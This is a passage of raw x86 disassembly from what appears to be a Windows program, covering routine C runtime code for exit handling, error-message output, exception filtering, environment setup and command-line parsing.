  401e06:	e8 5a 11 00 00       	call   0x402f65
  401e0b:	c3                   	ret
  401e0c:	8b ff                	mov    %edi,%edi
  401e0e:	55                   	push   %ebp
  401e0f:	8b ec                	mov    %esp,%ebp
  401e11:	6a 00                	push   $0x0
  401e13:	6a 00                	push   $0x0
  401e15:	ff 75 08             	push   0x8(%ebp)
  401e18:	e8 c3 fe ff ff       	call   0x401ce0
  401e1d:	83 c4 0c             	add    $0xc,%esp
  401e20:	5d                   	pop    %ebp
  401e21:	c3                   	ret
  401e22:	8b ff                	mov    %edi,%edi
  401e24:	55                   	push   %ebp
  401e25:	8b ec                	mov    %esp,%ebp
  401e27:	6a 00                	push   $0x0
  401e29:	6a 01                	push   $0x1
  401e2b:	ff 75 08             	push   0x8(%ebp)
  401e2e:	e8 ad fe ff ff       	call   0x401ce0
  401e33:	83 c4 0c             	add    $0xc,%esp
  401e36:	5d                   	pop    %ebp
  401e37:	c3                   	ret
  401e38:	6a 01                	push   $0x1
  401e3a:	6a 00                	push   $0x0
  401e3c:	6a 00                	push   $0x0
  401e3e:	e8 9d fe ff ff       	call   0x401ce0
  401e43:	83 c4 0c             	add    $0xc,%esp
  401e46:	c3                   	ret
  401e47:	6a 01                	push   $0x1
  401e49:	6a 01                	push   $0x1
  401e4b:	6a 00                	push   $0x0
  401e4d:	e8 8e fe ff ff       	call   0x401ce0
  401e52:	83 c4 0c             	add    $0xc,%esp
  401e55:	c3                   	ret
  401e56:	8b ff                	mov    %edi,%edi
  401e58:	56                   	push   %esi
  401e59:	e8 66 0b 00 00       	call   0x4029c4
  401e5e:	8b f0                	mov    %eax,%esi
  401e60:	56                   	push   %esi
  401e61:	e8 56 42 00 00       	call   0x4060bc
  401e66:	56                   	push   %esi
  401e67:	e8 e1 41 00 00       	call   0x40604d
  401e6c:	56                   	push   %esi
  401e6d:	e8 6e f9 ff ff       	call   0x4017e0
  401e72:	56                   	push   %esi
  401e73:	e8 c6 41 00 00       	call   0x40603e
  401e78:	56                   	push   %esi
  401e79:	e8 b1 41 00 00       	call   0x40602f
  401e7e:	56                   	push   %esi
  401e7f:	e8 99 3f 00 00       	call   0x405e1d
  401e84:	56                   	push   %esi
  401e85:	e8 fe 01 00 00       	call   0x402088
  401e8a:	56                   	push   %esi
  401e8b:	e8 39 3b 00 00       	call   0x4059c9
  401e90:	68 22 1e 40 00       	push   $0x401e22
  401e95:	e8 b8 0a 00 00       	call   0x402952
  401e9a:	83 c4 24             	add    $0x24,%esp
  401e9d:	a3 80 d1 40 00       	mov    %eax,0x40d180
  401ea2:	5e                   	pop    %esi
  401ea3:	c3                   	ret
  401ea4:	8b ff                	mov    %edi,%edi
  401ea6:	55                   	push   %ebp
  401ea7:	8b ec                	mov    %esp,%ebp
  401ea9:	51                   	push   %ecx
  401eaa:	51                   	push   %ecx
  401eab:	53                   	push   %ebx
  401eac:	8b 5d 08             	mov    0x8(%ebp),%ebx
  401eaf:	56                   	push   %esi
  401eb0:	57                   	push   %edi
  401eb1:	33 f6                	xor    %esi,%esi
  401eb3:	33 ff                	xor    %edi,%edi
  401eb5:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401eb8:	3b 1c fd 88 d1 40 00 	cmp    0x40d188(,%edi,8),%ebx
  401ebf:	74 09                	je     0x401eca
  401ec1:	47                   	inc    %edi
  401ec2:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401ec5:	83 ff 17             	cmp    $0x17,%edi
  401ec8:	72 ee                	jb     0x401eb8
  401eca:	83 ff 17             	cmp    $0x17,%edi
  401ecd:	0f 83 77 01 00 00    	jae    0x40204a
  401ed3:	6a 03                	push   $0x3
  401ed5:	e8 13 45 00 00       	call   0x4063ed
  401eda:	59                   	pop    %ecx
  401edb:	83 f8 01             	cmp    $0x1,%eax
  401ede:	0f 84 34 01 00 00    	je     0x402018
  401ee4:	6a 03                	push   $0x3
  401ee6:	e8 02 45 00 00       	call   0x4063ed
  401eeb:	59                   	pop    %ecx
  401eec:	85 c0                	test   %eax,%eax
  401eee:	75 0d                	jne    0x401efd
  401ef0:	83 3d 00 d0 40 00 01 	cmpl   $0x1,0x40d000
  401ef7:	0f 84 1b 01 00 00    	je     0x402018
  401efd:	81 fb fc 00 00 00    	cmp    $0xfc,%ebx
  401f03:	0f 84 41 01 00 00    	je     0x40204a
  401f09:	68 d8 a7 40 00       	push   $0x40a7d8
  401f0e:	bb 14 03 00 00       	mov    $0x314,%ebx
  401f13:	53                   	push   %ebx
  401f14:	bf 48 df 40 00       	mov    $0x40df48,%edi
  401f19:	57                   	push   %edi
  401f1a:	e8 66 44 00 00       	call   0x406385
  401f1f:	83 c4 0c             	add    $0xc,%esp
  401f22:	85 c0                	test   %eax,%eax
  401f24:	74 0d                	je     0x401f33
  401f26:	56                   	push   %esi
  401f27:	56                   	push   %esi
  401f28:	56                   	push   %esi
  401f29:	56                   	push   %esi
  401f2a:	56                   	push   %esi
  401f2b:	e8 bf f8 ff ff       	call   0x4017ef
  401f30:	83 c4 14             	add    $0x14,%esp
  401f33:	68 04 01 00 00       	push   $0x104
  401f38:	be 61 df 40 00       	mov    $0x40df61,%esi
  401f3d:	56                   	push   %esi
  401f3e:	6a 00                	push   $0x0
  401f40:	c6 05 65 e0 40 00 00 	movb   $0x0,0x40e065
  401f47:	ff 15 08 a0 40 00    	call   *0x40a008
  401f4d:	85 c0                	test   %eax,%eax
  401f4f:	75 26                	jne    0x401f77
  401f51:	68 c0 a7 40 00       	push   $0x40a7c0
  401f56:	68 fb 02 00 00       	push   $0x2fb
  401f5b:	56                   	push   %esi
  401f5c:	e8 24 44 00 00       	call   0x406385
  401f61:	83 c4 0c             	add    $0xc,%esp
  401f64:	85 c0                	test   %eax,%eax
  401f66:	74 0f                	je     0x401f77
  401f68:	33 c0                	xor    %eax,%eax
  401f6a:	50                   	push   %eax
  401f6b:	50                   	push   %eax
  401f6c:	50                   	push   %eax
  401f6d:	50                   	push   %eax
  401f6e:	50                   	push   %eax
  401f6f:	e8 7b f8 ff ff       	call   0x4017ef
  401f74:	83 c4 14             	add    $0x14,%esp
  401f77:	56                   	push   %esi
  401f78:	e8 13 2a 00 00       	call   0x404990
  401f7d:	40                   	inc    %eax
  401f7e:	59                   	pop    %ecx
  401f7f:	83 f8 3c             	cmp    $0x3c,%eax
  401f82:	76 38                	jbe    0x401fbc
  401f84:	56                   	push   %esi
  401f85:	e8 06 2a 00 00       	call   0x404990
  401f8a:	83 ee 3b             	sub    $0x3b,%esi
  401f8d:	03 c6                	add    %esi,%eax
  401f8f:	6a 03                	push   $0x3
  401f91:	b9 5c e2 40 00       	mov    $0x40e25c,%ecx
  401f96:	68 bc a7 40 00       	push   $0x40a7bc
  401f9b:	2b c8                	sub    %eax,%ecx
  401f9d:	51                   	push   %ecx
  401f9e:	50                   	push   %eax
  401f9f:	e8 2c 43 00 00       	call   0x4062d0
  401fa4:	83 c4 14             	add    $0x14,%esp
  401fa7:	85 c0                	test   %eax,%eax
  401fa9:	74 11                	je     0x401fbc
  401fab:	33 f6                	xor    %esi,%esi
  401fad:	56                   	push   %esi
  401fae:	56                   	push   %esi
  401faf:	56                   	push   %esi
  401fb0:	56                   	push   %esi
  401fb1:	56                   	push   %esi
  401fb2:	e8 38 f8 ff ff       	call   0x4017ef
  401fb7:	83 c4 14             	add    $0x14,%esp
  401fba:	eb 02                	jmp    0x401fbe
  401fbc:	33 f6                	xor    %esi,%esi
  401fbe:	68 b8 a7 40 00       	push   $0x40a7b8
  401fc3:	53                   	push   %ebx
  401fc4:	57                   	push   %edi
  401fc5:	e8 92 42 00 00       	call   0x40625c
  401fca:	83 c4 0c             	add    $0xc,%esp
  401fcd:	85 c0                	test   %eax,%eax
  401fcf:	74 0d                	je     0x401fde
  401fd1:	56                   	push   %esi
  401fd2:	56                   	push   %esi
  401fd3:	56                   	push   %esi
  401fd4:	56                   	push   %esi
  401fd5:	56                   	push   %esi
  401fd6:	e8 14 f8 ff ff       	call   0x4017ef
  401fdb:	83 c4 14             	add    $0x14,%esp
  401fde:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401fe1:	ff 34 c5 8c d1 40 00 	push   0x40d18c(,%eax,8)
  401fe8:	53                   	push   %ebx
  401fe9:	57                   	push   %edi
  401fea:	e8 6d 42 00 00       	call   0x40625c
  401fef:	83 c4 0c             	add    $0xc,%esp
  401ff2:	85 c0                	test   %eax,%eax
  401ff4:	74 0d                	je     0x402003
  401ff6:	56                   	push   %esi
  401ff7:	56                   	push   %esi
  401ff8:	56                   	push   %esi
  401ff9:	56                   	push   %esi
  401ffa:	56                   	push   %esi
  401ffb:	e8 ef f7 ff ff       	call   0x4017ef
  402000:	83 c4 14             	add    $0x14,%esp
  402003:	68 10 20 01 00       	push   $0x12010
  402008:	68 90 a7 40 00       	push   $0x40a790
  40200d:	57                   	push   %edi
  40200e:	e8 e0 40 00 00       	call   0x4060f3
  402013:	83 c4 0c             	add    $0xc,%esp
  402016:	eb 32                	jmp    0x40204a
  402018:	6a f4                	push   $0xfffffff4
  40201a:	ff 15 78 a0 40 00    	call   *0x40a078
  402020:	8b d8                	mov    %eax,%ebx
  402022:	3b de                	cmp    %esi,%ebx
  402024:	74 24                	je     0x40204a
  402026:	83 fb ff             	cmp    $0xffffffff,%ebx
  402029:	74 1f                	je     0x40204a
  40202b:	6a 00                	push   $0x0
  40202d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402030:	50                   	push   %eax
  402031:	8d 34 fd 8c d1 40 00 	lea    0x40d18c(,%edi,8),%esi
  402038:	ff 36                	push   (%esi)
  40203a:	e8 51 29 00 00       	call   0x404990
  40203f:	59                   	pop    %ecx
  402040:	50                   	push   %eax
  402041:	ff 36                	push   (%esi)
  402043:	53                   	push   %ebx
  402044:	ff 15 2c a0 40 00    	call   *0x40a02c
  40204a:	5f                   	pop    %edi
  40204b:	5e                   	pop    %esi
  40204c:	5b                   	pop    %ebx
  40204d:	c9                   	leave
  40204e:	c3                   	ret
  40204f:	6a 03                	push   $0x3
  402051:	e8 97 43 00 00       	call   0x4063ed
  402056:	59                   	pop    %ecx
  402057:	83 f8 01             	cmp    $0x1,%eax
  40205a:	74 15                	je     0x402071
  40205c:	6a 03                	push   $0x3
  40205e:	e8 8a 43 00 00       	call   0x4063ed
  402063:	59                   	pop    %ecx
  402064:	85 c0                	test   %eax,%eax
  402066:	75 1f                	jne    0x402087
  402068:	83 3d 00 d0 40 00 01 	cmpl   $0x1,0x40d000
  40206f:	75 16                	jne    0x402087
  402071:	68 fc 00 00 00       	push   $0xfc
  402076:	e8 29 fe ff ff       	call   0x401ea4
  40207b:	68 ff 00 00 00       	push   $0xff
  402080:	e8 1f fe ff ff       	call   0x401ea4
  402085:	59                   	pop    %ecx
  402086:	59                   	pop    %ecx
  402087:	c3                   	ret
  402088:	c3                   	ret
  402089:	8b ff                	mov    %edi,%edi
  40208b:	55                   	push   %ebp
  40208c:	8b ec                	mov    %esp,%ebp
  40208e:	51                   	push   %ecx
  40208f:	51                   	push   %ecx
  402090:	56                   	push   %esi
  402091:	e8 0a 0b 00 00       	call   0x402ba0
  402096:	8b f0                	mov    %eax,%esi
  402098:	85 f6                	test   %esi,%esi
  40209a:	0f 84 46 01 00 00    	je     0x4021e6
  4020a0:	8b 56 5c             	mov    0x5c(%esi),%edx
  4020a3:	a1 4c d2 40 00       	mov    0x40d24c,%eax
  4020a8:	57                   	push   %edi
  4020a9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4020ac:	8b ca                	mov    %edx,%ecx
  4020ae:	53                   	push   %ebx
  4020af:	39 39                	cmp    %edi,(%ecx)
  4020b1:	74 0e                	je     0x4020c1
  4020b3:	8b d8                	mov    %eax,%ebx
  4020b5:	6b db 0c             	imul   $0xc,%ebx,%ebx
  4020b8:	83 c1 0c             	add    $0xc,%ecx
  4020bb:	03 da                	add    %edx,%ebx
  4020bd:	3b cb                	cmp    %ebx,%ecx
  4020bf:	72 ee                	jb     0x4020af
  4020c1:	6b c0 0c             	imul   $0xc,%eax,%eax
  4020c4:	03 c2                	add    %edx,%eax
  4020c6:	3b c8                	cmp    %eax,%ecx
  4020c8:	73 08                	jae    0x4020d2
  4020ca:	39 39                	cmp    %edi,(%ecx)
  4020cc:	75 04                	jne    0x4020d2
  4020ce:	8b c1                	mov    %ecx,%eax
  4020d0:	eb 02                	jmp    0x4020d4
  4020d2:	33 c0                	xor    %eax,%eax
  4020d4:	85 c0                	test   %eax,%eax
  4020d6:	74 0a                	je     0x4020e2
  4020d8:	8b 58 08             	mov    0x8(%eax),%ebx
  4020db:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020de:	85 db                	test   %ebx,%ebx
  4020e0:	75 07                	jne    0x4020e9
  4020e2:	33 c0                	xor    %eax,%eax
  4020e4:	e9 fb 00 00 00       	jmp    0x4021e4
  4020e9:	83 fb 05             	cmp    $0x5,%ebx
  4020ec:	75 0c                	jne    0x4020fa
  4020ee:	83 60 08 00          	andl   $0x0,0x8(%eax)
  4020f2:	33 c0                	xor    %eax,%eax
  4020f4:	40                   	inc    %eax
  4020f5:	e9 ea 00 00 00       	jmp    0x4021e4
  4020fa:	83 fb 01             	cmp    $0x1,%ebx
  4020fd:	0f 84 de 00 00 00    	je     0x4021e1
  402103:	8b 4e 60             	mov    0x60(%esi),%ecx
  402106:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402109:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40210c:	89 4e 60             	mov    %ecx,0x60(%esi)
  40210f:	8b 48 04             	mov    0x4(%eax),%ecx
  402112:	83 f9 08             	cmp    $0x8,%ecx
  402115:	0f 85 b8 00 00 00    	jne    0x4021d3
  40211b:	8b 0d 40 d2 40 00    	mov    0x40d240,%ecx
  402121:	8b 3d 44 d2 40 00    	mov    0x40d244,%edi
  402127:	8b d1                	mov    %ecx,%edx
  402129:	03 f9                	add    %ecx,%edi
  40212b:	3b d7                	cmp    %edi,%edx
  40212d:	7d 24                	jge    0x402153
  40212f:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  402132:	8b 7e 5c             	mov    0x5c(%esi),%edi
  402135:	83 64 39 08 00       	andl   $0x0,0x8(%ecx,%edi,1)
  40213a:	8b 3d 40 d2 40 00    	mov    0x40d240,%edi
  402140:	8b 1d 44 d2 40 00    	mov    0x40d244,%ebx
  402146:	42                   	inc    %edx
  402147:	03 df                	add    %edi,%ebx
  402149:	83 c1 0c             	add    $0xc,%ecx
  40214c:	3b d3                	cmp    %ebx,%edx
  40214e:	7c e2                	jl     0x402132
  402150:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402153:	8b 00                	mov    (%eax),%eax
  402155:	8b 7e 64             	mov    0x64(%esi),%edi
  402158:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  40215d:	75 09                	jne    0x402168
  40215f:	c7 46 64 83 00 00 00 	movl   $0x83,0x64(%esi)
  402166:	eb 5e                	jmp    0x4021c6
  402168:	3d 90 00 00 c0       	cmp    $0xc0000090,%eax
  40216d:	75 09                	jne    0x402178
  40216f:	c7 46 64 81 00 00 00 	movl   $0x81,0x64(%esi)
  402176:	eb 4e                	jmp    0x4021c6
  402178:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  40217d:	75 09                	jne    0x402188
  40217f:	c7 46 64 84 00 00 00 	movl   $0x84,0x64(%esi)
  402186:	eb 3e                	jmp    0x4021c6
  402188:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40218d:	75 09                	jne    0x402198
  40218f:	c7 46 64 85 00 00 00 	movl   $0x85,0x64(%esi)
  402196:	eb 2e                	jmp    0x4021c6
  402198:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  40219d:	75 09                	jne    0x4021a8
  40219f:	c7 46 64 82 00 00 00 	movl   $0x82,0x64(%esi)
  4021a6:	eb 1e                	jmp    0x4021c6
  4021a8:	3d 8f 00 00 c0       	cmp    $0xc000008f,%eax
  4021ad:	75 09                	jne    0x4021b8
  4021af:	c7 46 64 86 00 00 00 	movl   $0x86,0x64(%esi)
  4021b6:	eb 0e                	jmp    0x4021c6
  4021b8:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  4021bd:	75 07                	jne    0x4021c6
  4021bf:	c7 46 64 8a 00 00 00 	movl   $0x8a,0x64(%esi)
  4021c6:	ff 76 64             	push   0x64(%esi)
  4021c9:	6a 08                	push   $0x8
  4021cb:	ff d3                	call   *%ebx
  4021cd:	59                   	pop    %ecx
  4021ce:	89 7e 64             	mov    %edi,0x64(%esi)
  4021d1:	eb 07                	jmp    0x4021da
  4021d3:	83 60 08 00          	andl   $0x0,0x8(%eax)
  4021d7:	51                   	push   %ecx
  4021d8:	ff d3                	call   *%ebx
  4021da:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4021dd:	59                   	pop    %ecx
  4021de:	89 46 60             	mov    %eax,0x60(%esi)
  4021e1:	83 c8 ff             	or     $0xffffffff,%eax
  4021e4:	5b                   	pop    %ebx
  4021e5:	5f                   	pop    %edi
  4021e6:	5e                   	pop    %esi
  4021e7:	c9                   	leave
  4021e8:	c3                   	ret
  4021e9:	8b ff                	mov    %edi,%edi
  4021eb:	56                   	push   %esi
  4021ec:	57                   	push   %edi
  4021ed:	33 ff                	xor    %edi,%edi
  4021ef:	39 3d cc fa 40 00    	cmp    %edi,0x40facc
  4021f5:	75 05                	jne    0x4021fc
  4021f7:	e8 ac 22 00 00       	call   0x4044a8
  4021fc:	8b 35 d8 fa 40 00    	mov    0x40fad8,%esi
  402202:	85 f6                	test   %esi,%esi
  402204:	75 05                	jne    0x40220b
  402206:	be 70 a8 40 00       	mov    $0x40a870,%esi
  40220b:	8a 06                	mov    (%esi),%al
  40220d:	3c 20                	cmp    $0x20,%al
  40220f:	77 08                	ja     0x402219
  402211:	84 c0                	test   %al,%al
  402213:	74 2e                	je     0x402243
  402215:	85 ff                	test   %edi,%edi
  402217:	74 24                	je     0x40223d
  402219:	3c 22                	cmp    $0x22,%al
  40221b:	75 09                	jne    0x402226
  40221d:	33 c9                	xor    %ecx,%ecx
  40221f:	85 ff                	test   %edi,%edi
  402221:	0f 94 c1             	sete   %cl
  402224:	8b f9                	mov    %ecx,%edi
  402226:	0f b6 c0             	movzbl %al,%eax
  402229:	50                   	push   %eax
  40222a:	e8 5c 42 00 00       	call   0x40648b
  40222f:	59                   	pop    %ecx
  402230:	85 c0                	test   %eax,%eax
  402232:	74 01                	je     0x402235
  402234:	46                   	inc    %esi
  402235:	46                   	inc    %esi
  402236:	eb d3                	jmp    0x40220b
  402238:	3c 20                	cmp    $0x20,%al
  40223a:	77 07                	ja     0x402243
  40223c:	46                   	inc    %esi
  40223d:	8a 06                	mov    (%esi),%al
  40223f:	84 c0                	test   %al,%al
  402241:	75 f5                	jne    0x402238
  402243:	5f                   	pop    %edi
  402244:	8b c6                	mov    %esi,%eax
  402246:	5e                   	pop    %esi
  402247:	c3                   	ret
  402248:	83 3d cc fa 40 00 00 	cmpl   $0x0,0x40facc
  40224f:	75 05                	jne    0x402256
  402251:	e8 52 22 00 00       	call   0x4044a8
  402256:	56                   	push   %esi
  402257:	8b 35 00 df 40 00    	mov    0x40df00,%esi
  40225d:	57                   	push   %edi
  40225e:	33 ff                	xor    %edi,%edi
  402260:	85 f6                	test   %esi,%esi
  402262:	75 18                	jne    0x40227c
  402264:	83 c8 ff             	or     $0xffffffff,%eax
  402267:	e9 a0 00 00 00       	jmp    0x40230c
  40226c:	3c 3d                	cmp    $0x3d,%al
  40226e:	74 01                	je     0x402271
  402270:	47                   	inc    %edi
  402271:	56                   	push   %esi
  402272:	e8 19 27 00 00       	call   0x404990
  402277:	59                   	pop    %ecx
  402278:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  40227c:	8a 06                	mov    (%esi),%al
  40227e:	84 c0                	test   %al,%al
  402280:	75 ea                	jne    0x40226c
  402282:	6a 04                	push   $0x4
  402284:	47                   	inc    %edi
  402285:	57                   	push   %edi
  402286:	e8 54 26 00 00       	call   0x4048df
  40228b:	8b f8                	mov    %eax,%edi
  40228d:	59                   	pop    %ecx
  40228e:	59                   	pop    %ecx
  40228f:	89 3d 20 df 40 00    	mov    %edi,0x40df20
  402295:	85 ff                	test   %edi,%edi
  402297:	74 cb                	je     0x402264
  402299:	8b 35 00 df 40 00    	mov    0x40df00,%esi
  40229f:	53                   	push   %ebx
  4022a0:	eb 42                	jmp    0x4022e4
  4022a2:	56                   	push   %esi
  4022a3:	e8 e8 26 00 00       	call   0x404990
  4022a8:	8b d8                	mov    %eax,%ebx
  4022aa:	43                   	inc    %ebx
  4022ab:	80 3e 3d             	cmpb   $0x3d,(%esi)
  4022ae:	59                   	pop    %ecx
  4022af:	74 31                	je     0x4022e2
  4022b1:	6a 01                	push   $0x1
  4022b3:	53                   	push   %ebx
  4022b4:	e8 26 26 00 00       	call   0x4048df
  4022b9:	59                   	pop    %ecx
  4022ba:	59                   	pop    %ecx
  4022bb:	89 07                	mov    %eax,(%edi)
  4022bd:	85 c0                	test   %eax,%eax
  4022bf:	74 4e                	je     0x40230f
  4022c1:	56                   	push   %esi
  4022c2:	53                   	push   %ebx
  4022c3:	50                   	push   %eax
  4022c4:	e8 bc 40 00 00       	call   0x406385
  4022c9:	83 c4 0c             	add    $0xc,%esp
  4022cc:	85 c0                	test   %eax,%eax
  4022ce:	74 0f                	je     0x4022df
  4022d0:	33 c0                	xor    %eax,%eax
  4022d2:	50                   	push   %eax
  4022d3:	50                   	push   %eax
  4022d4:	50                   	push   %eax
  4022d5:	50                   	push   %eax
  4022d6:	50                   	push   %eax
  4022d7:	e8 13 f5 ff ff       	call   0x4017ef
  4022dc:	83 c4 14             	add    $0x14,%esp
  4022df:	83 c7 04             	add    $0x4,%edi
  4022e2:	03 f3                	add    %ebx,%esi
  4022e4:	80 3e 00             	cmpb   $0x0,(%esi)
  4022e7:	75 b9                	jne    0x4022a2
  4022e9:	ff 35 00 df 40 00    	push   0x40df00
  4022ef:	e8 f7 24 00 00       	call   0x4047eb
  4022f4:	83 25 00 df 40 00 00 	andl   $0x0,0x40df00
  4022fb:	83 27 00             	andl   $0x0,(%edi)
  4022fe:	c7 05 c0 fa 40 00 01 	movl   $0x1,0x40fac0
  402305:	00 00 00 
  402308:	33 c0                	xor    %eax,%eax
  40230a:	59                   	pop    %ecx
  40230b:	5b                   	pop    %ebx
  40230c:	5f                   	pop    %edi
  40230d:	5e                   	pop    %esi
  40230e:	c3                   	ret
  40230f:	ff 35 20 df 40 00    	push   0x40df20
  402315:	e8 d1 24 00 00       	call   0x4047eb
  40231a:	83 25 20 df 40 00 00 	andl   $0x0,0x40df20
  402321:	83 c8 ff             	or     $0xffffffff,%eax
  402324:	eb e4                	jmp    0x40230a
  402326:	8b ff                	mov    %edi,%edi
  402328:	55                   	push   %ebp
  402329:	8b ec                	mov    %esp,%ebp
  40232b:	51                   	push   %ecx
  40232c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40232f:	53                   	push   %ebx
  402330:	33 c0                	xor    %eax,%eax
  402332:	56                   	push   %esi
  402333:	89 07                	mov    %eax,(%edi)
  402335:	8b f2                	mov    %edx,%esi
  402337:	8b 55 0c             	mov    0xc(%ebp),%edx
  40233a:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  402340:	39 45 08             	cmp    %eax,0x8(%ebp)
  402343:	74 09                	je     0x40234e
  402345:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402348:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  40234c:	89 13                	mov    %edx,(%ebx)
  40234e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402351:	80 3e 22             	cmpb   $0x22,(%esi)
  402354:	75 10                	jne    0x402366
  402356:	33 c0                	xor    %eax,%eax
  402358:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40235b:	b3 22                	mov    $0x22,%bl
  40235d:	0f 94 c0             	sete   %al
  402360:	46                   	inc    %esi
  402361:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402364:	eb 3c                	jmp    0x4023a2
  402366:	ff 07                	incl   (%edi)
  402368:	85 d2                	test   %edx,%edx
  40236a:	74 08                	je     0x402374
  40236c:	8a 06                	mov    (%esi),%al
  40236e:	88 02                	mov    %al,(%edx)
  402370:	42                   	inc    %edx
  402371:	89 55 0c             	mov    %edx,0xc(%ebp)
  402374:	8a 1e                	mov    (%esi),%bl
  402376:	0f b6 c3             	movzbl %bl,%eax
  402379:	50                   	push   %eax
  40237a:	46                   	inc    %esi
  40237b:	e8 0b 41 00 00       	call   0x40648b
  402380:	59                   	pop    %ecx
  402381:	85 c0                	test   %eax,%eax
  402383:	74 13                	je     0x402398
  402385:	ff 07                	incl   (%edi)
  402387:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40238b:	74 0a                	je     0x402397
  40238d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402390:	8a 06                	mov    (%esi),%al
  402392:	ff 45 0c             	incl   0xc(%ebp)
  402395:	88 01                	mov    %al,(%ecx)
  402397:	46                   	inc    %esi
  402398:	8b 55 0c             	mov    0xc(%ebp),%edx
  40239b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40239e:	84 db                	test   %bl,%bl
  4023a0:	74 32                	je     0x4023d4
  4023a2:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4023a6:	75 a9                	jne    0x402351
  4023a8:	80 fb 20             	cmp    $0x20,%bl
  4023ab:	74 05                	je     0x4023b2
  4023ad:	80 fb 09             	cmp    $0x9,%bl
  4023b0:	75 9f                	jne    0x402351
  4023b2:	85 d2                	test   %edx,%edx
  4023b4:	74 04                	je     0x4023ba
  4023b6:	c6 42 ff 00          	movb   $0x0,-0x1(%edx)
  4023ba:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4023be:	80 3e 00             	cmpb   $0x0,(%esi)
  4023c1:	0f 84 e9 00 00 00    	je     0x4024b0
  4023c7:	8a 06                	mov    (%esi),%al
  4023c9:	3c 20                	cmp    $0x20,%al
  4023cb:	74 04                	je     0x4023d1
  4023cd:	3c 09                	cmp    $0x9,%al
  4023cf:	75 06                	jne    0x4023d7
  4023d1:	46                   	inc    %esi
  4023d2:	eb f3                	jmp    0x4023c7
  4023d4:	4e                   	dec    %esi
  4023d5:	eb e3                	jmp    0x4023ba
  4023d7:	80 3e 00             	cmpb   $0x0,(%esi)
  4023da:	0f 84 d0 00 00 00    	je     0x4024b0
  4023e0:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4023e4:	74 09                	je     0x4023ef
  4023e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4023e9:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  4023ed:	89 10                	mov    %edx,(%eax)
  4023ef:	ff 01                	incl   (%ecx)
  4023f1:	33 db                	xor    %ebx,%ebx
  4023f3:	43                   	inc    %ebx
  4023f4:	33 c9                	xor    %ecx,%ecx
  4023f6:	eb 02                	jmp    0x4023fa
  4023f8:	46                   	inc    %esi
  4023f9:	41                   	inc    %ecx
  4023fa:	80 3e 5c             	cmpb   $0x5c,(%esi)
  4023fd:	74 f9                	je     0x4023f8
  4023ff:	80 3e 22             	cmpb   $0x22,(%esi)
  402402:	75 26                	jne    0x40242a
  402404:	f6 c1 01             	test   $0x1,%cl
  402407:	75 1f                	jne    0x402428
  402409:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40240d:	74 0c                	je     0x40241b
  40240f:	8d 46 01             	lea    0x1(%esi),%eax
  402412:	80 38 22             	cmpb   $0x22,(%eax)
  402415:	75 04                	jne    0x40241b
  402417:	8b f0                	mov    %eax,%esi
  402419:	eb 0d                	jmp    0x402428
  40241b:	33 c0                	xor    %eax,%eax
  40241d:	33 db                	xor    %ebx,%ebx
  40241f:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  402422:	0f 94 c0             	sete   %al
  402425:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402428:	d1 e9                	shr    $1,%ecx
  40242a:	85 c9                	test   %ecx,%ecx
  40242c:	74 12                	je     0x402440
  40242e:	49                   	dec    %ecx
  40242f:	85 d2                	test   %edx,%edx
  402431:	74 04                	je     0x402437
  402433:	c6 02 5c             	movb   $0x5c,(%edx)
  402436:	42                   	inc    %edx
  402437:	ff 07                	incl   (%edi)
  402439:	85 c9                	test   %ecx,%ecx
  40243b:	75 f1                	jne    0x40242e
  40243d:	89 55 0c             	mov    %edx,0xc(%ebp)
  402440:	8a 06                	mov    (%esi),%al
  402442:	84 c0                	test   %al,%al
  402444:	74 55                	je     0x40249b
  402446:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40244a:	75 08                	jne    0x402454
  40244c:	3c 20                	cmp    $0x20,%al
  40244e:	74 4b                	je     0x40249b
  402450:	3c 09                	cmp    $0x9,%al
  402452:	74 47                	je     0x40249b
  402454:	85 db                	test   %ebx,%ebx
  402456:	74 3d                	je     0x402495
  402458:	0f be c0             	movsbl %al,%eax
  40245b:	50                   	push   %eax
  40245c:	85 d2                	test   %edx,%edx
  40245e:	74 23                	je     0x402483
  402460:	e8 26 40 00 00       	call   0x40648b
  402465:	59                   	pop    %ecx
  402466:	85 c0                	test   %eax,%eax
  402468:	74 0d                	je     0x402477
  40246a:	8a 06                	mov    (%esi),%al
  40246c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40246f:	ff 45 0c             	incl   0xc(%ebp)
  402472:	88 01                	mov    %al,(%ecx)
  402474:	46                   	inc    %esi
  402475:	ff 07                	incl   (%edi)
  402477:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40247a:	8a 06                	mov    (%esi),%al
